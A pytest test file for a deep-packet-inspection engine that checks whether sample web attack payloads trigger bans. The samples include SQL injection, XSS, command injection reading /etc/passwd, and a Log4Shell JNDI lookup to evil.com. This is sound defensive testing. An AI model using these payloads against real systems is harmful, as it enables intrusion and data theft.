"""
Tests for DPIEngine — Layer 7 attack detection.
No network, no DB required.
"""
import pytest
from detectors.dpi import DPIEngine, BAN_THRESHOLD
from domain.models import PacketInfo


def make_packet(payload: str, port_dst: int = 80) -> PacketInfo:
    return PacketInfo(
        ip_src="1.2.3.4",
        ip_dst="5.6.7.8",
        protocol="TCP",
        port_src=12345,
        port_dst=port_dst,
        payload=payload,
    )


@pytest.fixture
def engine():
    return DPIEngine()


# --- Clean traffic ---

def test_clean_payload_returns_none(engine):
    p = make_packet("GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
    assert engine.inspect(p) is None


def test_empty_payload_returns_none(engine):
    p = make_packet("", port_dst=80)
    assert engine.inspect(p) is None


def test_non_http_port_returns_none(engine):
    p = make_packet("UNION SELECT * FROM users", port_dst=22)
    assert engine.inspect(p) is None


def test_https_port_returns_none(engine):
    p = make_packet("UNION SELECT * FROM users", port_dst=443)
    assert engine.inspect(p) is None


# --- SQL Injection ---

def test_sqli_union_select_triggers_ban(engine):
    p = make_packet("GET /?id=1 UNION SELECT username,password FROM users HTTP/1.1")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True
    assert "SQLi" in result.alert


def test_sqli_drop_table_triggers_ban(engine):
    p = make_packet("'; DROP TABLE users; --")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


def test_sqli_tautology_triggers_ban(engine):
    p = make_packet("' or '1'='1")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


def test_sqli_url_encoded_bypass(engine):
    # %75nion%20select decodes to "union select"
    p = make_packet("GET /?id=%75nion%20select%201,2,3 HTTP/1.1")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


# --- XSS ---

def test_xss_script_tag_triggers_ban(engine):
    p = make_packet('<script>alert("xss")</script>')
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True
    assert "XSS" in result.alert


def test_xss_javascript_protocol_triggers_ban(engine):
    p = make_packet("javascript:alert(1)")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


# --- Command Injection ---

def test_cmd_injection_semicolon_triggers_ban(engine):
    p = make_packet("GET /?name=test; whoami HTTP/1.1")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


def test_cmd_injection_pipe_triggers_ban(engine):
    p = make_packet("GET /?q=hello|cat /etc/passwd HTTP/1.1")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


# --- Remote Code Execution ---

def test_log4shell_triggers_ban(engine):
    p = make_packet("${jndi:ldap://evil.com/a}")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True
    assert "Log4Shell" in result.alert


def test_php_rce_triggers_ban(engine):
    p = make_packet("system('id')")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


def test_windows_cmd_triggers_ban(engine):
    p = make_packet("cmd.exe /c whoami")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is True


# --- Path Traversal ---

def test_path_traversal_triggers_alert(engine):
    p = make_packet("GET /../../etc/passwd HTTP/1.1")
    result = engine.inspect(p)
    assert result is not None
    # ../../ is MEDIUM (5pts) -> >= BAN_THRESHOLD=5, should ban
    assert result.should_ban is True


def test_etc_passwd_low_severity_no_ban(engine):
    # /etc/passwd alone is LOW (2pts) -> below BAN_THRESHOLD=5
    p = make_packet("/etc/passwd")
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is False


# --- Score threshold ---

def test_score_below_threshold_no_ban(engine):
    # OR condition alone is MEDIUM = 5pts, BAN_THRESHOLD = 5, should_ban = True (>=)
    # Use a LOW-only hit to stay below threshold
    p = make_packet("Nmap scan report for 1.2.3.4")  # LOW = 2pts
    result = engine.inspect(p)
    assert result is not None
    assert result.should_ban is False
    assert "2" in result.alert  # score=2


# --- Scanner detection ---

def test_scanner_useragent_triggers_alert(engine):
    p = make_packet("GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n")
    result = engine.inspect(p)
    assert result is not None
    assert "Scanner" in result.alert


# --- Port variants ---

def test_port_8080_is_inspected(engine):
    p = make_packet("UNION SELECT 1", port_dst=8080)
    result = engine.inspect(p)
    assert result is not None


def test_port_8000_is_inspected(engine):
    p = make_packet("UNION SELECT 1", port_dst=8000)
    result = engine.inspect(p)
    assert result is not None
